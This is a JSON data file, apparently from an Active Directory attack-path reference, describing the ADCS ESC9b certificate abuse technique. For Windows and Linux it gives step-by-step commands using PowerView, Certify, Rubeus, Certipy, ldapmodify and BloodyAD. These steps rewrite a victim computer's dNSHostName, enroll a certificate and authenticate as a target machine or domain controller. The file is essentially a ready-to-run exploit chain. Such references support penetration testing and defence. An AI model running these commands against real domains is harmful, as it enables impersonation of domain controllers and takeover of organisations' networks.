{
    "ADCSESC9b": {
        "meaning": "The principal has control over a victim computer with permission to enroll on one or more certificate templates configured to enable certificate authentication, require the dNSHostName of the enrollee included in the Subject Alternative Name (SAN), and not have the security extension enabled. There is an affected Domain Controller configured to allow weak certificate binding enforcement. This allows impersonating any AD forest computer by manipulating the victim computer's dNSHostName before certificate enrollment.",
        "common": "",
        "windows": {
            "PowerView_Certify": [
                {
                    "order": 1,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}",
                    "description": "Remove SPNs including dNSHostName on victim to avoid conflicts"
                },
                {
                    "order": 2,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='target.corp.local'}",
                    "description": "Set dNSHostName of victim computer to target computer's dNSHostName"
                },
                {
                    "order": 3,
                    "command": "Get-DomainObject -Identity VICTIM -Properties mail",
                    "description": "Check if victim has mail attribute set (required for some templates)"
                },
                {
                    "order": 4,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
                    "description": "Set mail attribute if required by certificate template"
                },
                {
                    "order": 5,
                    "command": "# Obtain session as victim computer using GenericAll control",
                    "description": "Obtain session as SYSTEM on victim host for computer account access"
                },
                {
                    "order": 6,
                    "command": "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE /machine",
                    "description": "Enroll certificate as victim computer with manipulated dNSHostName in SAN"
                },
                {
                    "order": 7,
                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
                    "description": "Convert certificate to PFX format"
                },
                {
                    "order": 8,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}",
                    "description": "Restore victim dNSHostName to original value"
                },
                {
                    "order": 9,
                    "command": "Rubeus.exe asktgt /certificate:cert.pfx /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER",
                    "description": "Authenticate as target computer using certificate"
                }
            ],
            "PowerView_Simple": [
                {
                    "order": 1,
                    "command": "Set-DomainObject -Identity VICTIM_COMPUTER -Set @{'dnshostname'='DC01.domain.com'}",
                    "description": "Set victim computer dNSHostName to target domain controller"
                },
                {
                    "order": 2,
                    "command": "# Obtain SYSTEM session on victim computer",
                    "description": "Get computer account access via SYSTEM privileges"
                },
                {
                    "order": 3,
                    "command": "Certify.exe request /ca:CA_HOST\\CA_NAME /template:Machine /machine",
                    "description": "Enroll machine certificate with target dNSHostName"
                },
                {
                    "order": 4,
                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
                    "description": "Convert to PFX format"
                },
                {
                    "order": 5,
                    "command": "Rubeus.exe asktgt /certificate:cert.pfx /user:DC01$ /domain:domain.com /ptt",
                    "description": "Authenticate as target domain controller"
                }
            ]
        },
        "linux": {
            "Certipy": [
                {
                    "order": 1,
                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\ndelete: servicePrincipalName\\nservicePrincipalName: SPN\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Remove SPN entries including dNSHostName on victim"
                },
                {
                    "order": 2,
                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL",
                    "description": "Set dNSHostName of victim computer to target computer's dNSHostName"
                },
                {
                    "order": 3,
                    "command": "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
                    "description": "Check if victim has mail attribute set"
                },
                {
                    "order": 4,
                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Set mail attribute if required by certificate template"
                },
                {
                    "order": 5,
                    "command": "# Obtain session as victim computer using GenericAll control",
                    "description": "Obtain computer account access via control over computer object"
                },
                {
                    "order": 6,
                    "command": "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
                    "description": "Enroll certificate as victim with dNSHostName in SAN"
                },
                {
                    "order": 7,
                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL",
                    "description": "Restore victim dNSHostName to original value"
                },
                {
                    "order": 8,
                    "command": "certipy auth -pfx TARGET.pfx -dc-ip IP",
                    "description": "Authenticate as target computer using certificate"
                }
            ],
            "LDAP_Manual": [
                {
                    "order": 1,
                    "command": "echo -e \"dn: CN=VICTIM,CN=Computers,DC=domain,DC=com\\nchangetype: modify\\nreplace: dNSHostName\\ndNSHostName: target.domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
                    "description": "Set victim computer dNSHostName to target via LDAP"
                },
                {
                    "order": 2,
                    "command": "# Obtain computer account credentials or session",
                    "description": "Get access to victim computer account for certificate enrollment"
                },
                {
                    "order": 3,
                    "command": "# Request certificate with manipulated dNSHostName",
                    "description": "Enroll certificate with target dNSHostName in SAN"
                },
                {
                    "order": 4,
                    "command": "echo -e \"dn: CN=VICTIM,CN=Computers,DC=domain,DC=com\\nchangetype: modify\\nreplace: dNSHostName\\ndNSHostName: victim.domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
                    "description": "Restore victim dNSHostName after certificate enrollment"
                },
                {
                    "order": 5,
                    "command": "python3 gettgtpkinit.py domain.com/target$ -cert-pfx target.pfx -pfx-pass password -dc-ip DC_IP",
                    "description": "Authenticate as target computer using certificate via PKINIT"
                }
            ],
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Computers,DC=domain,DC=com' dNSHostName 'target.domain.com'",
                    "description": "Set victim computer dNSHostName to target using BloodyAD"
                },
                {
                    "order": 2,
                    "command": "# Obtain victim computer session and enroll certificate",
                    "description": "Use computer account access to request certificate"
                },
                {
                    "order": 3,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Computers,DC=domain,DC=com' dNSHostName 'victim.domain.com'",
                    "description": "Restore victim dNSHostName after certificate enrollment"
                }
            ]
        }
    }
}
